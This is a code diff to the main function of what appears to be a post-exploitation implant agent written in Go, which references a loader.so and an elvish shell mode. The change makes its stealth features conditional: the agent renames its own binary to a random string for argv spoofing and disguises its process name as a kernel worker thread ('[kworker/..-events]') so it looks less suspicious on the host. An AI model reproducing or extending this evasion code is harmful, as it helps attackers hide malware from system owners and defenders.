@@ -44,6 +44,8 @@ func main() {
 	// do not self delete
 	// also do not rename process since we might be invokded by loader.so
 	persistent := os.Getenv("PERSISTENCE") == "true"
+	// are we running from loader.so?
+	run_from_loader := os.Getenv("LD") == "true"
 
 	// -replace specified in environment variable
 	if os.Getenv("REPLACE_AGENT") != "" {
@@ -59,7 +61,7 @@ func main() {
 
 	// rename to make room for argv spoofing
 	if len(util.FileBaseName(os.Args[0])) < 30 &&
-		!persistent && !runElvsh {
+		!persistent && !run_from_loader && !runElvsh {
 		new_name := util.RandStr(30)
 		os.Rename(os.Args[0], new_name)
 		pwd, err := os.Getwd()
@@ -111,15 +113,17 @@ func main() {
 		}
 	}
 
-	// rename our agent process to make it less suspecious
-	self_path, err := os.Readlink("/proc/self/exe")
-	if err != nil {
-		self_path = os.Args[0]
-	}
 	osArgs := os.Args
-	agent.SetProcessName(fmt.Sprintf("[kworker/%d:%d-events]",
-		util.RandInt(1, 20),
-		util.RandInt(0, 6)))
+	self_path, err := os.Readlink("/proc/self/exe")
+	if !persistent && !run_from_loader && !runElvsh {
+		// rename our agent process to make it less suspecious
+		if err != nil {
+			self_path = os.Args[0]
+		}
+		agent.SetProcessName(fmt.Sprintf("[kworker/%d:%d-events]",
+			util.RandInt(1, 20),
+			util.RandInt(0, 6)))
+	}
 
 	// run as elvish shell
 	if runElvsh {
